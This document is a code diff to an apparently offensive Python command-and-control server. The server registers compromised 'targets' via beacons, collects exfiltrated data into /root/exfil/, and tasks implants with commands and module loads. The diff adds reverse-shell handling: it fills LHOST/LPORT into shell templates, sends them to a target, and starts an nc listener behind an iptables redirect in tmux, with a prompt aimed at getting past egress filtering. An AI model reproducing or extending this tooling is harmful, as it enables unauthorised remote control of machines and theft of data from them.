@@ -10,6 +10,9 @@ import logging
 import json
 from io import BytesIO
 
+
+import libtmux
+
 import validators
 import shutil
 
@@ -37,8 +40,14 @@ import pty
 SETTINGS = {
 "exfil_dir":"/root/exfil/",
 "static_dir":"static/",
+"shell_dir":"shell/",
+"LHOST":None,
+"LPORT":None,
+"target":None,
+"vars":["target", "LHOST", "LPORT"],
 "protocol":"https",
-"static_url":None
+"static_url":None,
+"session_count":0
 }
 
 targets = []
@@ -47,9 +56,8 @@ target_info_all = {}
 
 tasks = {}
 
-target = None
+#target = None
 
-params = ["target"]
 
 style = Style.from_dict({
     # User input (default text).
@@ -65,6 +73,7 @@ style = Style.from_dict({
     'path':     'ansicyan underline',
 })
 
+tmux = libtmux.Server()
 sess = PromptSession()
 
 curr_prompt = None
@@ -158,11 +167,12 @@ class TrashCollector(BaseHTTPRequestHandler):
             #self.send_html(self.html("error"))
 
     def get_host(self):
-        return self.headers["Host"].strip("\r\n")
+        #return self.headers["Host"].strip("\r\n")
+        return self.client_address[0]
 
 
     def do_POST(self):
-        global target
+        #global target
         global curr_prompt
         global loop
 
@@ -189,8 +199,8 @@ class TrashCollector(BaseHTTPRequestHandler):
             target_info_all[host] = post_data
             target_info_all[host]["ip"] = host 
             print("Target added: {}".format(host))
-            if not target:
-                target = host
+            if not SETTINGS["target"]:
+                SETTINGS["target"] = host
 
         elif post_data.get("beacon", None) == ['True']:
             target_info_all[host] = post_data
@@ -243,12 +253,14 @@ def task(target, cmd, args):
     tasks[target].append({cmd:args})
 
 def set(k,v):
-    global target
-    if k in params:
-        globals()[k] = v
+    #global target
+    global SETTINGS
+    if k in SETTINGS["vars"]:
+        #globals()[k] = v
+        SETTINGS[k] = v
     else:
         #print("Settable params: {}".format(params))
-        task(target, "set", (k, v))
+        task(SETTINGS["target"], "set", (k, v))
 
 def show(k):
     if k in globals():
@@ -281,7 +293,7 @@ def get_prompt(target_info):
     return message
 
 def prompt(async_=False):
-    target_info = target_info_all.get(target, None)
+    target_info = target_info_all.get(SETTINGS['target'], None)
     return sess.prompt(get_prompt(target_info), style=style, async_=async_)
 
 def load_module(filename):
@@ -291,12 +303,32 @@ def load_module(filename):
             mod = os.path.splitext(mod)[0]
 
             code = module.read()
-            task(target, 'load_module', (mod, code))
+            task(SETTINGS["target"], 'load_module', (mod, code))
             
-            print("Loading {} on {}".format(filename, target))
+            print("Loading {} on {}".format(filename, SETTINGS["target"]))
     except Exception as e:
         print("Could not read file {}".format(filename))
         print(e)
+
+
+# Warning: Linux specific, requires iptables and tmux
+def handle_shell(host):
+    #global tmux
+    #iptables -t nat -A PREROUTING -p tcp -s {LHOST} --dport {LPORT} -j REDIRECT --to-port {HANDLE_PORT}
+    real_port = get_open_port()
+    iptables = "iptables -t nat -{CMD} PREROUTING -p tcp -s {RHOST} --dport {LPORT} -j REDIRECT --to-port {REAL_PORT}"
+    
+    handler_cmd = iptables.format(CMD="A", RHOST=host, LPORT=SETTINGS["LPORT"], REAL_PORT=real_port)
+    handler_cmd += "; "
+    handler_cmd += "nc -nvlp {REAL_PORT}".format(REAL_PORT=real_port)
+    handler_cmd += "; "
+    handler_cmd += iptables.format(CMD="D", RHOST=host, LPORT=SETTINGS["LPORT"], REAL_PORT=real_port)
+    print("Handler: \n{0}\n{1}\n{0}\n".format("-"*(len(handler_cmd) + 3) , handler_cmd))
+    name = "({})_{}".format(SETTINGS["session_count"], host.replace(".", "-"))
+    tmux.new_session(name, window_command=handler_cmd)
+    tmux.list_sessions()
+    print("To interact: attach {}".format(name))
+    SETTINGS["session_count"] = SETTINGS["session_count"] + 1
 
 def in_directory(file, directory):
     #make both absolute    
@@ -308,13 +340,14 @@ def in_directory(file, directory):
     return os.path.commonprefix([file, directory]) == directory
 
 def do(cmd):
+    #global tmux
     try:
         if not cmd:
             return
         arr = shlex.split(cmd)
         c = arr[0]
         if c == "set":
-            set(arr[1], arr[2] if len(arr) >1 else None)
+            set(arr[1], arr[2] if len(arr) > 2 else None)
         elif c == "show" or (c in globals() and not callable(globals()[c])):
             if c == "show":
                 show(arr[1])
@@ -363,20 +396,51 @@ def do(cmd):
                 else:
                     url = os.path.join(SETTINGS['static_url'], url_path)
                     print("File ready at {}".format(url))
-            if target:
-                task(target, c, url)
+            if SETTINGS["target"]:
+                task(SETTINGS["target"], c, url)
             else:
                 print('Set a target - try "show targets"')
-                
+        elif c == 'shell':
+            if len(arr) > 1 and os.path.exists(compute_path(arr[1], dir=SETTINGS['shell_dir'])):
+                shell_file = compute_path(arr[1], dir=SETTINGS['shell_dir'])
+                print("Reading from {}".format(shell_file))
+                with open(shell_file, 'r') as f:
+                    s = f.read()
+                    for setting in SETTINGS["vars"]:
+                        s = s.replace("{"+setting+"}", str(SETTINGS[setting]))
+
+                    print(s)
+                    if SETTINGS["target"]:
+                        shell_arr = shlex.split(s)
+                        #task(SETTINGS["target"], shell_arr[0], ' '.join(shlex.quote(x) for x in shell_arr[1:]) )
+                        task(SETTINGS["target"], shell_arr[0], shell_arr[1:] )
+                    else:
+                        print('Set a target - try "show targets"')
+                    handle_shell(SETTINGS['target'])
+        
+            else:
+                print("Possible shells:")
+                for root, dirs, file in os.walk(SETTINGS['shell_dir']):
+                    for f in file:
+                        p = os.path.join(root, f)
+                        p = p[len(os.path.commonprefix([SETTINGS['shell_dir'], p])):]
+                        print(p)
+               
+        elif c == 'attach':
+            tmux.attach_session(arr[1])         
+        elif c == 'sessions':
+            for s in tmux.list_sessions():
+                print(s)
         elif c == "exit":
             print("Killing the server...")
             #sys.exit(1)
+            tmux.kill_server()
             os._exit(1)
         else:
-            if not target:
+            if not SETTINGS["target"]:
                 print('Set a target - try "show targets"')
             else:
-                task(target, c, arr[1:])
+                task(SETTINGS["target"], c, arr[1:])
     except Exception as e:
         print(e)
 
@@ -399,7 +463,17 @@ def get_srv_ip():
             return ip_map[int(choice)][1]
         except Exception as e:
             print("Invalid selection")
-            
+
+def get_shell_port():
+    default = 80
+    message = [
+        ("class:choice", "Please set LPORT for shells\nNote: this should A) be allowed by egress filtering and B) not be used actively used [{}]:".format(default))
+    ]
+    choice = prompt_toolkit.prompt(message, style=style)
+    if not choice:
+        choice = default
+    return choice
+
 def get_srv_port(ip):
     default = "443"
 
@@ -440,6 +514,26 @@ def get_srv_port(ip):
                 s.close()
                 break
 
+def get_open_port():
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.bind(("",0))
+    s.listen(1)
+    port = s.getsockname()[1]
+    s.close()
+    return port
+
+
+
+
+# if the user set an absolute path, use that, otherwise default to relative to install dir
+def compute_path(path, dir=None):
+    if dir is None:
+        dir = os.getcwd()
+
+    if not os.path.isabs(path):
+        path = os.path.join(dir, path)
+    return path
+
 async def get_input():
     global curr_prompt
     dbg = 3
@@ -468,6 +562,7 @@ async def get_input():
 
 if __name__=="__main__":
     global loop
+
     ip = get_srv_ip()
     port = get_srv_port(ip)
     #Start thread in the background
@@ -476,17 +571,18 @@ if __name__=="__main__":
     srv_thread.start()
 
     SETTINGS['static_url'] = "{}://{}:{}/".format(SETTINGS['protocol'], ip, port)
-    static_dir = SETTINGS['static_dir']
+    SETTINGS['LHOST'] = ip
+    SETTINGS['LPORT'] = str(get_shell_port())
 
-    if not os.path.isabs(static_dir):
-        static_dir = os.path.join(os.getcwd(), static_dir)
-        SETTINGS['static_dir'] = static_dir
+
+    for d in ['static_dir', 'shell_dir']:
+        SETTINGS[d] = compute_path(SETTINGS[d])
 
     try:
         os.makedirs(static_dir)
     except Exception as e:
         pass
-    print("Static URL: {} serves {}".format(SETTINGS['static_url'], static_dir))
+    print("Static URL: {} serves {}".format(SETTINGS['static_url'], SETTINGS['static_dir']))
 
     prompt_toolkit.eventloop.defaults.use_asyncio_event_loop() 
 
